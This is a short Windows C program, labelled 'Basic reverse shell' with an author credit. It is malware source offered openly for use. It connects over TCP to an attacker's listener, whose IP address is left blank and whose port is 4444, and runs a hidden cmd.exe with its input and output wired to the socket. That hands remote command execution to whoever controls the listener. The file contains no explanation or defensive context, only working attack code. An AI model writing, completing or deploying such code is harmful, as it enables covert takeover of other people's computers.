/******************************************************
* Basic reverse shell                                 *
* Author: TheQuietKid                                 *
* My github profile: https://github.com/TheQuietKid20 *
* *****************************************************
*/
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32")

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    WSADATA wsaData;
    SOCKET sock;

    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

    if (iResult == 0)
    {
        struct sockaddr_in serv;

        char ip[] = "";//ip address of your server/listener
        int port = 4444;

        if ((sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) != INVALID_SOCKET)
        {
            serv.sin_family = AF_INET;
            serv.sin_port = htons(port);
            inet_pton(AF_INET, ip, &serv.sin_addr.s_addr);

            if(WSAConnect(sock, (SOCKADDR*)&serv, sizeof(serv), NULL, NULL, NULL, NULL) != SOCKET_ERROR)
            {
                STARTUPINFOA si;
                PROCESS_INFORMATION pi;

                memset(&si, 0, sizeof(si));
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
                si.wShowWindow = SW_HIDE;

                CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
    }

    return 1;
}